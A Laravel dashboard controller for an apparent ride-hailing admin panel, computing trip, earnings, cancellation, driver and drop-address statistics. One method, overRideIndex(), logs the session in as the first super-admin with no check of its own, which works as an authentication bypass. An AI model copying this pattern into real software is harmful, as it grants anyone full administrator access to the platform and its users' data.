<?php

namespace App\Http\Controllers;
use Inertia\Inertia;
use App\Models\Request\Request;
use App\Models\Request\RequestBill;
use App\Models\Admin\Driver;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request as HttpRequest;
use Illuminate\Support\Facades\Session;
use App\Http\Controllers\Web\BaseController;
use App\Models\Admin\ServiceLocation;


class DashBoardController extends BaseController
{
    public function index()
    {

        if(access()->hasRole('user')){

            return redirect('/create-booking');
        }
        if (access()->hasRole('owner')) {
            return redirect()->route('owner.dashboard');
        }
        if (access()->hasRole('dispatcher')) {
            return redirect()->route('dispatch.dashboard');
        }

        if (access()->hasRole('employee')) {
            return redirect('/support-tickets');
        }


// dd($cancelledtrips);
        $firebaseConfig = (object) [
            'apiKey' => get_firebase_settings('firebase_api_key'),
            'authDomain' => get_firebase_settings('firebase_auth_domain'),
            'databaseURL' => get_firebase_settings('firebase_database_url'),
            'projectId' => get_firebase_settings('firebase_project_id'),
            'storageBucket' => get_firebase_settings('firebase_storage_bucket'),
            'messagingSenderId' => get_firebase_settings('firebase_messaging_sender_id'),
            'appId' => get_firebase_settings('firebase_app_id'),
        ];

        return Inertia::render('pages/dashboard/index', ['firebaseConfig' => $firebaseConfig,]);
    }
    public function todayEarnings(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        // Assuming $today is defined or set to today's date
        $today = now()->toDateString();
        // Fetch the data
        $tripQuery = Request::selectRaw('
            IFNULL(SUM(CASE WHEN is_completed=1 THEN 1 ELSE 0 END), 0) AS completed,
            IFNULL(SUM(CASE WHEN is_completed=0 AND is_cancelled=0 THEN 1 ELSE 0 END), 0) AS scheduled,
            IFNULL(SUM(CASE WHEN is_cancelled=1 THEN 1 ELSE 0 END), 0) AS cancelled
        ');

        $tripQuery = $tripQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $tripQuery = $tripQuery->where('service_location_id',$service_location_id);
        }
        $overallTrips = $tripQuery->first();
        $todayTrips = $tripQuery->whereDate('created_at', $today)->first();

             // Fetch overall data


//Today Earnings && today trips
        $cardEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=0,request_bills.total_amount,0)),0)";
        $cashEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=1,request_bills.total_amount,0)),0)";
        $walletEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=2,request_bills.total_amount,0)),0)";
        $adminCommissionQuery = "IFNULL(SUM(request_bills.admin_commision_with_tax),0)";
        $driverCommissionQuery = "IFNULL(SUM(request_bills.driver_commision),0)";
        $totalEarningsQuery = "$cardEarningsQuery + $cashEarningsQuery + $walletEarningsQuery";

        $earningQuery = Request::leftJoin('request_bills','requests.id','request_bills.request_id')
                            ->selectRaw("
                            {$cardEarningsQuery} AS card,
                            {$cashEarningsQuery} AS cash,
                            {$walletEarningsQuery} AS wallet,
                            {$totalEarningsQuery} AS total,
                            {$adminCommissionQuery} as admin_commision,
                            {$driverCommissionQuery} as driver_commision
                        ")
                        ->companyKey()
                        ->where('requests.is_completed',true);

        $earningQuery = $earningQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $earningQuery = $earningQuery->where('service_location_id',$service_location_id);
        }

//Over All Earnings
        $overallEarnings = $earningQuery->first();

        $todayEarnings = $earningQuery->whereDate('requests.trip_start_time',date('Y-m-d'))->first();

        $todayEarningData=[
            "card"=> $todayEarnings->card,
            "cash"=> $todayEarnings->cash,
            "wallet"=> $todayEarnings->wallet,
            "total"=> $todayEarnings->total,
            "admin_commision"=> $todayEarnings->admin_commision,
            "driver_commision"=> $todayEarnings->driver_commision,
        ];

        $overallEarningData=[
            "card"=> $overallEarnings->card,
            "cash"=> $overallEarnings->cash,
            "wallet"=> $overallEarnings->wallet,
            "total"=> $overallEarnings->total,
            "admin_commision"=> $overallEarnings->admin_commision,
            "driver_commision"=> $overallEarnings->driver_commision,
        ];

        $data = [
            'today' => [
                'completed' => (int) $todayTrips->completed,
                'scheduled' => (int) $todayTrips->scheduled,
                'cancelled' => (int) $todayTrips->cancelled,
                'earnings' => $todayEarningData,
            ],
            'overall' => [
                'completed' => (int) $overallTrips->completed,
                'scheduled' => (int) $overallTrips->scheduled,
                'cancelled' => (int) $overallTrips->cancelled,
                'earnings' => $overallEarningData,
            ],
        ];

        // Return JSON response
        return response()->json($data);
    }
    public function overallEarnings(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)

        // Initialize arrays for months and earnings
        $months = [];
        $values = [];

        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month

            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;

            // Sum up the earnings for the current month
            $totalEarnings = RequestBill::whereHas('requestDetail', function ($query) use ($from, $to, $service_location_id) {
                $query->companyKey()->whereBetween('trip_start_time', [$from, $to])->whereIsCompleted(true);
                 if($service_location_id && $service_location_id !== 'all'){
                        $query->where('service_location_id',$service_location_id);
                    }
                    else{
                        $query->whereIn('service_location_id',get_user_location_ids(auth()->user()));
                    }
            })->sum('total_amount');

            // Add the total earnings for the month to the values array
            $values[] = $totalEarnings;

            // Move to the next month
            $startDate->addMonth();
        }

        // Prepare the data to be returned
        $earningsData = [
            'earnings' => [
                'months' => $months,
                'values' => $values,
            ],
        ];

        // Return the data as a JSON response
        return response()->json($earningsData);
    }
    public function cancelChart(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)

        // Initialize arrays for months and cancellation data
        $months = [];
        $a = []; // Cancelled by method '0'
        $u = []; // Cancelled by method '1'
        $d = []; // Cancelled by method '2'

        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month

            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;

            $cancelQuery = Request::companyKey()->whereIsCancelled(true);

            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }
            // Collect cancellation data based on cancel method
            $a[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', "0")
                ->count();

            $cancelQuery = Request::companyKey()->whereIsCancelled(true);

            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }

            $u[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '1')
                ->count();

            $cancelQuery = Request::companyKey()->whereIsCancelled(true);

            $cancelQuery = $cancelQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
            if($service_location_id && $service_location_id !== 'all'){
                $cancelQuery = $cancelQuery->where('service_location_id',$service_location_id);
            }

            $d[] = $cancelQuery->whereBetween('created_at', [$from, $to])
                ->where('cancel_method', '2')
                ->count();

            // Move to the next month
            $startDate->addMonth();
        }

        // Prepare the data to be returned
        $cancelData = [
            'y' => $months,
            'a' => $a,
            'u' => $u,
            'd' => $d,
        ];

        $tripQuery = Request::companyKey()->where('created_at','>',Carbon::now()->startOfYear());

        $tripQuery = $tripQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));
        if($service_location_id && $service_location_id !== 'all'){
            $tripQuery = $tripQuery->where('service_location_id',$service_location_id);
        }
        $cancelledtrips = $tripQuery->selectRaw('
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 0 THEN 1 END) AS auto_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 1 THEN 1 END) AS user_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 2 THEN 1 END) AS driver_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND cancel_method = 3 THEN 1 END) AS dispatcher_cancelled,
            COUNT(CASE WHEN is_cancelled = 1 AND is_completed = 0  THEN 1 END) AS total_cancelled
        ')->first();


        $cancelData['data'] = $cancelledtrips;
        // Return the data as a JSON response
        return response()->json($cancelData);
    }


    public function overallMenu() {
        return Inertia::render('pages/overall-menu');
    }

    public function overRideIndex()
    {

        $user = User::belongsToRole('super-admin')->first();

        auth('web')->login($user, true);

        return redirect()->route('dashboard');
    }

    public function dashboardData(HttpRequest $request)
    {

        $service_location_id = $request->service_location_id;
        $today = date('Y-m-d');
        $currency_symbol = get_settings('currency_symbol');

        // card Datas
        $total_drivers_query = Driver::selectRaw('
                                        IFNULL(SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END),0) AS approved,
                                        IFNULL((SUM(CASE WHEN approve=1 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS approve_percentage,
                                        IFNULL((SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END) / count(*)),0) * 100 AS decline_percentage,
                                        IFNULL(SUM(CASE WHEN approve=0 THEN 1 ELSE 0 END),0) AS declined,
                                        COUNT(*) as total
                                    ')
                                    ->whereHas('user', function($query) {
                                        $query->whereHas('roles', function($roleQuery) {
                                            $roleQuery->where('name', 'driver');
                                        });
                                    })
                                    ->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $total_drivers_query = $total_drivers_query->where('service_location_id',$service_location_id);
        }

        $total_drivers_data = $total_drivers_query->first();

        $total_drivers = [
        'approved' => $total_drivers_data->approved,
        'declined' => $total_drivers_data->declined,
        'approve_percentage' => round($total_drivers_data->approve_percentage),
        'decline_percentage' => round($total_drivers_data->decline_percentage),
        'total' => $total_drivers_data->total,
      ];

        $total_users = User::belongsToRole('user')->count();

        // Food drivers count (drivers who can handle food deliveries)
        // For now, we'll count all approved drivers as potential food drivers
        // You can modify this logic based on your specific requirements
        /* $food_drivers_count = Driver::whereHas('user', function($query) {
                $query->whereHas('roles', function($roleQuery) {
                    $roleQuery->where('name', 'driver');
                });
            })
            ->where('approve', 1)
            ->where('transport_type', 'food')
            ->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $food_drivers_count = $food_drivers_count->where('service_location_id',$service_location_id);
        }

        $food_drivers_count = $food_drivers_count->count(); */

        return  response()->json([
            'totalDrivers' => $total_drivers,
            'totalUsers' => $total_users,
            'currencySymbol' => $currency_symbol,
            'foodDriversCount' => 0,
        ],200);
    }
    public function agentEarnings(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;


        //Today Earnings && today trips
        $cardEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=0,request_bills.agent_commision,0)),0)";
        $cashEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=1,request_bills.agent_commision,0)),0)";
        $walletEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=2,request_bills.agent_commision,0)),0)";
        $adminCommissionQuery = "IFNULL(SUM(request_bills.admin_commision_with_tax),0)";
        $driverCommissionQuery = "IFNULL(SUM(request_bills.driver_commision),0)";
        $totalEarningsQuery = "$cardEarningsQuery + $cashEarningsQuery + $walletEarningsQuery";

        $earningQuery = Request::leftJoin('request_bills','requests.id','request_bills.request_id')
                            ->selectRaw("
                            {$cardEarningsQuery} AS card,
                            {$cashEarningsQuery} AS cash,
                            {$walletEarningsQuery} AS wallet,
                            {$totalEarningsQuery} AS total,
                            {$adminCommissionQuery} as admin_commision,
                            {$driverCommissionQuery} as driver_commision
                        ")
                        ->companyKey()
                        ->where('requests.is_completed',true);

        $earningQuery = $earningQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $earningQuery = $earningQuery->where('service_location_id',$service_location_id);
        }

        //Over All Earnings
        $overallEarnings = $earningQuery->first();
        $todayEarnings = $earningQuery->whereDate('requests.trip_start_time',date('Y-m-d'))->first();


        $startDate = Carbon::now()->startOfYear(); // Start of the current year (January 1st)
        $endDate = Carbon::now(); // End date is now (current date)

        // Initialize arrays for months and earnings
        $months = [];
        $values = [];

        // Loop through each month from the start of the year to the current date
        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth(); // Start of the month
            $to = Carbon::parse($startDate)->endOfMonth(); // End of the month

            // Add the short name of the month to the months array
            $months[] = $startDate->shortEnglishMonth;

            // Sum up the earnings for the current month
            $totalEarnings = RequestBill::whereHas('requestDetail', function ($query) use ($from, $to, $service_location_id) {
                $query->companyKey()->whereBetween('trip_start_time', [$from, $to])->whereIsCompleted(true);
                 if($service_location_id && $service_location_id !== 'all'){
                        $query->where('service_location_id',$service_location_id);
                    }
                    else{
                        $query->whereIn('service_location_id',get_user_location_ids(auth()->user()));
                    }
            })->sum('agent_commision');

            // Add the total earnings for the month to the values array
            $values[] = $totalEarnings;

            // Move to the next month
            $startDate->addMonth();
        }

        $todayEarningData=[
            "card"=> $todayEarnings->card,
            "cash"=> $todayEarnings->cash,
            "wallet"=> $todayEarnings->wallet,
            "total"=> round($todayEarnings->total, 2),
            "admin_commision"=> $todayEarnings->admin_commision,
            "driver_commision"=> $todayEarnings->driver_commision,
        ];

        $overallEarningData=[
            "card"=> $overallEarnings->card,
            "cash"=> $overallEarnings->cash,
            "wallet"=> $overallEarnings->wallet,
            "total"=> round($overallEarnings->total, 2),
            "admin_commision"=> $overallEarnings->admin_commision,
            "driver_commision"=> $overallEarnings->driver_commision,
        ];

        // Prepare the data to be returned
        $earningsData = [
            'earnings' => [
                'months' => $months,
                'values' => $values,
                'agent_overall_earnngs' => $overallEarningData,
                'agent_today_earnings'  => $todayEarningData,
            ],
        ];

        // Return the data as a JSON response
        return response()->json($earningsData);
    }

    /* public function foodStatistics(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $today = now()->toDateString();

        // Food request statistics for today
        $foodTripQuery = Request::where('transport_type', 'food')->selectRaw('
            IFNULL(SUM(CASE WHEN is_completed=1 THEN 1 ELSE 0 END), 0) AS completed,
            IFNULL(SUM(CASE WHEN is_completed=0 AND is_cancelled=0 THEN 1 ELSE 0 END), 0) AS scheduled,
            IFNULL(SUM(CASE WHEN is_cancelled=1 THEN 1 ELSE 0 END), 0) AS cancelled
        ');

        $foodTripQuery = $foodTripQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $foodTripQuery = $foodTripQuery->where('service_location_id',$service_location_id);
        }

        $foodOverallTrips = $foodTripQuery->first();
        $foodTodayTrips = $foodTripQuery->whereDate('created_at', $today)->first();

        // Food earnings data
        $cardEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=0,request_bills.total_amount,0)),0)";
        $cashEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=1,request_bills.total_amount,0)),0)";
        $walletEarningsQuery = "IFNULL(SUM(IF(requests.payment_opt=2,request_bills.total_amount,0)),0)";
        $adminCommissionQuery = "IFNULL(SUM(request_bills.admin_commision_with_tax),0)";
        $driverCommissionQuery = "IFNULL(SUM(request_bills.driver_commision),0)";
        $totalEarningsQuery = "$cardEarningsQuery + $cashEarningsQuery + $walletEarningsQuery";

        $foodEarningQuery = Request::where('transport_type', 'food')
                            ->leftJoin('request_bills','requests.id','request_bills.request_id')
                            ->selectRaw("
                            {$cardEarningsQuery} AS card,
                            {$cashEarningsQuery} AS cash,
                            {$walletEarningsQuery} AS wallet,
                            {$totalEarningsQuery} AS total,
                            {$adminCommissionQuery} as admin_commision,
                            {$driverCommissionQuery} as driver_commision
                        ")
                        ->companyKey()
                        ->where('requests.is_completed',true);

        $foodEarningQuery = $foodEarningQuery->whereIn('service_location_id',get_user_location_ids(auth()->user()));

        if($service_location_id && $service_location_id !== 'all'){
            $foodEarningQuery = $foodEarningQuery->where('service_location_id',$service_location_id);
        }

        $foodOverallEarnings = $foodEarningQuery->first();
        $foodTodayEarnings = $foodEarningQuery->whereDate('requests.trip_start_time',date('Y-m-d'))->first();

        $foodTodayEarningData=[
            "card"=> $foodTodayEarnings->card,
            "cash"=> $foodTodayEarnings->cash,
            "wallet"=> $foodTodayEarnings->wallet,
            "total"=> $foodTodayEarnings->total,
            "admin_commision"=> $foodTodayEarnings->admin_commision,
            "driver_commision"=> $foodTodayEarnings->driver_commision,
        ];

        $foodOverallEarningData=[
            "card"=> $foodOverallEarnings->card,
            "cash"=> $foodOverallEarnings->cash,
            "wallet"=> $foodOverallEarnings->wallet,
            "total"=> $foodOverallEarnings->total,
            "admin_commision"=> $foodOverallEarnings->admin_commision,
            "driver_commision"=> $foodOverallEarnings->driver_commision,
        ];

        // Monthly food earnings chart data
        $startDate = Carbon::now()->startOfYear();
        $endDate = Carbon::now();
        $months = [];
        $values = [];

        while ($startDate->lte($endDate)) {
            $from = Carbon::parse($startDate)->startOfMonth();
            $to = Carbon::parse($startDate)->endOfMonth();

            $months[] = $startDate->shortEnglishMonth;

            $totalFoodEarnings = RequestBill::whereHas('requestDetail', function ($query) use ($from, $to, $service_location_id) {
                $query->companyKey()->whereBetween('trip_start_time', [$from, $to])
                      ->whereIsCompleted(true)->where('transport_type', 'food');
                if($service_location_id && $service_location_id !== 'all'){
                    $query->where('service_location_id',$service_location_id);
                } else {
                    $query->whereIn('service_location_id',get_user_location_ids(auth()->user()));
                }
            })->sum('total_amount');

            $values[] = $totalFoodEarnings;
            $startDate->addMonth();
        }

        $data = [
            'today' => [
                'completed' => (int) $foodTodayTrips->completed,
                'scheduled' => (int) $foodTodayTrips->scheduled,
                'cancelled' => (int) $foodTodayTrips->cancelled,
                'earnings' => $foodTodayEarningData,
            ],
            'overall' => [
                'completed' => (int) $foodOverallTrips->completed,
                'scheduled' => (int) $foodOverallTrips->scheduled,
                'cancelled' => (int) $foodOverallTrips->cancelled,
                'earnings' => $foodOverallEarningData,
            ],
            'earnings_chart' => [
                'months' => $months,
                'values' => $values,
            ],
        ];

        return response()->json($data);
    } */

    public function popularDropAddresses(HttpRequest $request)
    {
        $service_location_id = $request->service_location_id;
        $date_from = $request->date_from;
        $date_to = $request->date_to;

        $dropAddressesQuery = \App\Models\Request\RequestPlace::selectRaw('
                drop_address,
                COUNT(*) as count
            ')
            ->whereNotNull('drop_address')
            ->where('drop_address', '!=', '')
            ->groupBy('drop_address')
            ->orderBy('count', 'desc')
            ->limit(10);

        // Apply service location filter through request relationship
        $dropAddressesQuery = $dropAddressesQuery->whereHas('requestDetail', function ($query) use ($service_location_id, $date_from, $date_to) {
            $query->companyKey();

            if($service_location_id && $service_location_id !== 'all'){
                $query->where('service_location_id', $service_location_id);
            } else {
                $query->whereIn('service_location_id', get_user_location_ids(auth()->user()));
            }

            // Apply date filters if provided
            if ($date_from) {
                $query->where('created_at', '>=', $date_from);
            }
            if ($date_to) {
                $query->where('created_at', '<=', $date_to);
            }
        });

        $dropAddresses = $dropAddressesQuery->get();

        // Prepare data for chart
        $labels = $dropAddresses->pluck('drop_address')->map(function($address) {
            // Truncate long addresses for better display
            return strlen($address) > 30 ? substr($address, 0, 30) . '...' : $address;
        })->toArray();

        $data = $dropAddresses->pluck('count')->toArray();

        return response()->json([
            'labels' => $labels,
            'data' => $data
        ]);
    }
}
